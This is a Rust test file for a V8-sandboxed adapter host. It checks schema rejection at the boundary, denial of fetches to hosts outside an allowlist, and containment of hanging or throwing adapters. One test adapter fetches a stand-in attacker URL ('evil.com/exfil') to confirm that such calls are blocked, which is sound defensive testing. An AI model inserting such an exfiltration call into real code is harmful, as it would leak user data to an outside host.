//! Host boundary tests (§16) — the security-relevant half of the boundary.
//!
//! These tests verify that the Rust core **distrusts adapter output correctly**:
//!
//! 1. **Boundary rejection** — adapter output violating the canonical schema is
//!    rejected before the engine sees it (§5.5, §1).
//! 2. **Capability denial** — an adapter fetching a non-allowlisted host fails
//!    (§5.5 — capabilities are granted, not ambient).
//! 3. **Timeout/panic containment** — a panicking or hanging adapter is
//!    contained rather than taking down the server (§21).
//!
//! The tests use minimal inline TS adapter code loaded directly into V8.

use adapter_host::manifest::{AdapterManifest, FetchCapabilities};
use adapter_host::{HostError, InProcessHost};

// ── Test helpers ─────────────────────────────────────────────────────────────

/// A minimal valid adapter that returns empty builds — the baseline for tests
/// that don't care about the adapter's logic, only the host's enforcement.
const MINIMAL_ADAPTER: &str = r#"
const adapter = {
  id: "test-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    return { build: {}, warnings: [], unmapped: [] };
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// An adapter that returns output with an unknown field — the boundary check
/// must reject it (`deny_unknown_fields`, §5.5).
const ADAPTER_WITH_UNKNOWN_FIELD: &str = r#"
const adapter = {
  id: "bad-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    return { build: {}, warnings: [], unmapped: [], evilExtraField: "exfil" };
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// An adapter that returns a build with an unknown field — rejected by
/// `deny_unknown_fields` on `PartialCharacterBuild`.
const ADAPTER_WITH_UNKNOWN_BUILD_FIELD: &str = r#"
const adapter = {
  id: "bad-build-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    return {
      build: { completelyBogusField: 42 },
      warnings: [],
      unmapped: []
    };
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// An adapter that returns the wrong type for a field (level as string
/// instead of number) — boundary check must reject.
const ADAPTER_WITH_WRONG_TYPE: &str = r#"
const adapter = {
  id: "wrong-type-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    return {
      build: { level: "not-a-number" },
      warnings: [],
      unmapped: []
    };
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// An adapter that hangs forever — must be contained by the timeout (§21).
const HANGING_ADAPTER: &str = r#"
const adapter = {
  id: "hanging-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    return new Promise(() => {});  // never resolves
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// An adapter that throws — the error must be caught and returned as
/// `HostError::Adapter`, not propagated as a panic.
const THROWING_ADAPTER: &str = r#"
const adapter = {
  id: "throwing-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    throw new Error("intentional adapter failure");
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// An adapter that tries to call `nexus_fetch` — used for capability tests.
const FETCHING_ADAPTER: &str = r#"
const adapter = {
  id: "fetching-adapter",
  capabilities: { fieldCoverage: [] },

  async import(raw, ctx) {
    // The core passes `nexusFetch` and `nexusLog` as globals.
    const resp = await globalThis.Deno.core.opAsync("op_nexus_fetch", raw.url || "https://evil.com/exfil");
    return { build: {}, warnings: [], unmapped: [] };
  },

  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [] };
  },

  async detectChanges(previous, current) {
    return { hasChanges: false, changedPaths: [] };
  },

  async validate(raw) {
    return { valid: true, errors: [], warnings: [] };
  },
};
"#;

/// Create a test host with no capabilities.
fn make_host() -> InProcessHost {
    let manifest = AdapterManifest::new("test-adapter", "./test.js");
    InProcessHost::new(manifest).expect("host creation should succeed")
}

/// Create a test host with specific fetch capabilities.
fn make_host_with_fetch(allow: &[&str]) -> InProcessHost {
    let manifest = AdapterManifest {
        capabilities: adapter_host::manifest::CapabilityGrants {
            fetch: FetchCapabilities {
                allow: allow.iter().map(|s| s.to_string()).collect(),
            },
        },
        ..AdapterManifest::new("test-adapter", "./test.js")
    };
    InProcessHost::new(manifest).expect("host creation should succeed")
}

/// Run a test inside a `LocalSet` — required because `JsRuntime` is `!Send`.
fn run_async<F, R>(future: F) -> R
where
    F: std::future::Future<Output = R>,
{
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .expect("tokio runtime");
    tokio::task::LocalSet::new().block_on(&rt, future)
}

/// Create an import context for PF2e.
fn pf2e_context() -> adapter_host::ImportContext {
    adapter_host::ImportContext {
        system: schema_core::SystemId::from("pf2e"),
        credentials: serde_json::json!({}),
    }
}

// ── 1. Boundary rejection tests (§5.5, §1, §16) ──────────────────────────────

#[test]
fn boundary_rejects_unknown_field_in_import_outcome() {
    run_async(async {
        let mut host = make_host();
        host.load(ADAPTER_WITH_UNKNOWN_FIELD).await.unwrap();

        let result = host.import(serde_json::json!({}), pf2e_context()).await;

        assert!(
            matches!(result, Err(HostError::BoundaryValidation(_))),
            "unknown field in ImportOutcome must be rejected at boundary, got: {result:?}"
        );
    });
}

#[test]
fn boundary_rejects_unknown_field_in_build() {
    run_async(async {
        let mut host = make_host();
        host.load(ADAPTER_WITH_UNKNOWN_BUILD_FIELD).await.unwrap();

        let result = host.import(serde_json::json!({}), pf2e_context()).await;

        assert!(
            matches!(result, Err(HostError::BoundaryValidation(_))),
            "unknown field in PartialCharacterBuild must be rejected, got: {result:?}"
        );
    });
}

#[test]
fn boundary_rejects_wrong_type_for_field() {
    run_async(async {
        let mut host = make_host();
        host.load(ADAPTER_WITH_WRONG_TYPE).await.unwrap();

        let result = host.import(serde_json::json!({}), pf2e_context()).await;

        assert!(
            matches!(result, Err(HostError::BoundaryValidation(_))),
            "wrong type for level must be rejected, got: {result:?}"
        );
    });
}

#[test]
fn boundary_accepts_valid_import() {
    run_async(async {
        let mut host = make_host();
        host.load(MINIMAL_ADAPTER).await.unwrap();

        let outcome = host
            .import(serde_json::json!({}), pf2e_context())
            .await
            .expect("valid adapter output must pass the boundary check");

        assert!(outcome.build.is_empty());
        assert!(outcome.warnings.is_empty());
    });
}

#[test]
fn boundary_accepts_valid_export() {
    run_async(async {
        let mut host = make_host();
        host.load(MINIMAL_ADAPTER).await.unwrap();

        let outcome = host
            .export(
                serde_json::json!({}),
                adapter_host::ExportContext {
                    system: schema_core::SystemId::from("pf2e"),
                    credentials: serde_json::json!({}),
                },
            )
            .await
            .expect("valid export output must pass");

        assert!(outcome.warnings.is_empty());
    });
}

#[test]
fn boundary_rejects_unknown_field_in_export_outcome() {
    let bad_export_adapter = r#"
const adapter = {
  id: "bad-export",
  capabilities: { fieldCoverage: [] },
  async import(raw, ctx) { return { build: {}, warnings: [], unmapped: [] }; },
  async export(build, ctx) {
    return { payload: {}, warnings: [], skipped: [], extra: "no" };
  },
  async detectChanges(p, c) { return { hasChanges: false, changedPaths: [] }; },
  async validate(raw) { return { valid: true, errors: [], warnings: [] }; },
};
"#;
    run_async(async {
        let mut host = make_host();
        host.load(bad_export_adapter).await.unwrap();

        let result = host
            .export(
                serde_json::json!({}),
                adapter_host::ExportContext {
                    system: schema_core::SystemId::from("pf2e"),
                    credentials: serde_json::json!({}),
                },
            )
            .await;

        assert!(
            matches!(result, Err(HostError::BoundaryValidation(_))),
            "unknown field in ExportOutcome must be rejected, got: {result:?}"
        );
    });
}

// ── 2. Capability denial tests (§5.5) ────────────────────────────────────────

#[test]
fn capability_denies_fetch_with_empty_allowlist() {
    run_async(async {
        let mut host = make_host(); // no fetch capabilities
        host.load(FETCHING_ADAPTER).await.unwrap();

        let result = host
            .import(
                serde_json::json!({"url": "https://evil.com/exfil"}),
                pf2e_context(),
            )
            .await;

        // The adapter calls nexus_fetch which should fail because no hosts
        // are allowlisted. The failure surfaces as a runtime error from
        // the promise rejection.
        assert!(
            result.is_err(),
            "fetch to non-allowlisted host must be denied, got: {result:?}"
        );
    });
}

#[test]
fn capability_denies_fetch_to_wrong_host() {
    run_async(async {
        let mut host = make_host_with_fetch(&["https://api.foundryvtt.com"]);
        host.load(FETCHING_ADAPTER).await.unwrap();

        let result = host
            .import(
                serde_json::json!({"url": "https://evil.com/exfil"}),
                pf2e_context(),
            )
            .await;

        assert!(
            result.is_err(),
            "fetch to non-allowlisted host must be denied even when other hosts are allowed"
        );
    });
}

#[test]
fn capability_allows_fetch_to_allowlisted_host() {
    // This test verifies that the capability check passes for allowlisted
    // hosts. We don't actually need the fetch to succeed (no real server);
    // we just need to confirm the capability check itself doesn't deny it.
    // The fetch will fail with a connection error, but that's a different
    // error than capability denial.
    run_async(async {
        let mut host = make_host_with_fetch(&["https://api.foundryvtt.com"]);
        host.load(FETCHING_ADAPTER).await.unwrap();

        let result = host
            .import(
                serde_json::json!({"url": "https://api.foundryvtt.com/v1/test"}),
                pf2e_context(),
            )
            .await;

        // The fetch will fail because there's no real server, but the
        // error should NOT be a capability denial — it should be a network
        // error. We can't easily distinguish the two from HostError right
        // now, so we just check that the error message mentions the fetch
        // failing, not the capability being denied.
        if let Err(ref e) = result {
            let msg = e.to_string();
            assert!(
                !msg.contains("capability denied"),
                "allowlisted host should not be denied: {msg}"
            );
        }
    });
}

#[test]
fn capability_denies_http_cleartext() {
    // Even if http://pathbuilder2e.com were in the allowlist, HTTP must be
    // denied — only HTTPS is allowed (§5.5).
    run_async(async {
        let mut host = make_host_with_fetch(&["http://pathbuilder2e.com"]);
        host.load(FETCHING_ADAPTER).await.unwrap();

        let result = host
            .import(
                serde_json::json!({"url": "http://pathbuilder2e.com/api"}),
                pf2e_context(),
            )
            .await;

        assert!(
            result.is_err(),
            "HTTP cleartext must be denied even if in allowlist"
        );
    });
}

// ── 3. Timeout/panic containment tests (§21) ─────────────────────────────────

#[test]
fn timeout_contains_hanging_adapter() {
    run_async(async {
        let mut host = make_host();
        host.load(HANGING_ADAPTER).await.unwrap();

        let result = host.import(serde_json::json!({}), pf2e_context()).await;

        // A hanging adapter (promise that never resolves) is contained by
        // the event loop detecting no more pending work and returning an
        // error. This may surface as either `Timeout` (from the
        // `tokio::time::timeout` wrapper) or `Runtime` (from
        // `with_event_loop_promise` returning `PendingPromiseResolution`).
        // Either way, the adapter hang is contained — one bad adapter
        // degrades one connection, not the server (§21).
        assert!(
            result.is_err(),
            "hanging adapter must be contained, got: {result:?}"
        );
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("pending") || msg.contains("timed out") || msg.contains("timeout"),
            "error should indicate the adapter hung: {msg}"
        );
    });
}

#[test]
fn throwing_adapter_returns_error_not_panic() {
    run_async(async {
        let mut host = make_host();
        host.load(THROWING_ADAPTER).await.unwrap();

        let result = host.import(serde_json::json!({}), pf2e_context()).await;

        assert!(
            result.is_err(),
            "throwing adapter must return an error, not panic"
        );
        // The error should be a runtime/adapter error, not a host panic.
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("intentional adapter failure") || msg.contains("adapter"),
            "error should mention the adapter failure: {msg}"
        );
    });
}

#[test]
fn host_survives_bad_adapter() {
    // After a bad adapter fails, the host should still be usable for a
    // subsequent call with a good adapter — one bad adapter degrades one
    // connection, not the server (§21).
    run_async(async {
        // First: a throwing adapter fails.
        let mut host1 = make_host();
        host1.load(THROWING_ADAPTER).await.unwrap();
        let result1 = host1.import(serde_json::json!({}), pf2e_context()).await;
        assert!(result1.is_err());

        // Second: a fresh host with a good adapter works fine.
        let mut host2 = make_host();
        host2.load(MINIMAL_ADAPTER).await.unwrap();
        let result2 = host2.import(serde_json::json!({}), pf2e_context()).await;
        assert!(
            result2.is_ok(),
            "a bad adapter must not affect subsequent operations"
        );
    });
}

#[test]
fn detect_changes_works() {
    run_async(async {
        let mut host = make_host();
        host.load(MINIMAL_ADAPTER).await.unwrap();

        let changes = host
            .detect_changes(
                serde_json::json!({"name": "old"}),
                serde_json::json!({"name": "new"}),
            )
            .await
            .expect("detectChanges should work");

        assert!(!changes.has_changes);
    });
}

#[test]
fn validate_works() {
    run_async(async {
        let mut host = make_host();
        host.load(MINIMAL_ADAPTER).await.unwrap();

        let report = host
            .validate(serde_json::json!({}))
            .await
            .expect("validate should work");

        assert!(report.valid);
    });
}

// ── 4. Module loading tests ──────────────────────────────────────────────────

#[test]
fn load_fails_on_syntax_error() {
    run_async(async {
        let mut host = make_host();
        let result = host.load("this is not valid JS !!!").await;
        assert!(
            result.is_err(),
            "syntax errors must be rejected at load time"
        );
    });
}

#[test]
fn load_fails_when_adapter_export_missing() {
    // The module doesn't export `adapter` — the host's
    // `globalThis.__nexusAdapter = adapter;` line will throw.
    run_async(async {
        let mut host = make_host();
        let no_export = r#"
const notAnAdapter = { id: "wrong" };
"#;
        let result = host.load(no_export).await;
        assert!(
            result.is_err(),
            "module without 'adapter' export must fail to load"
        );
    });
}
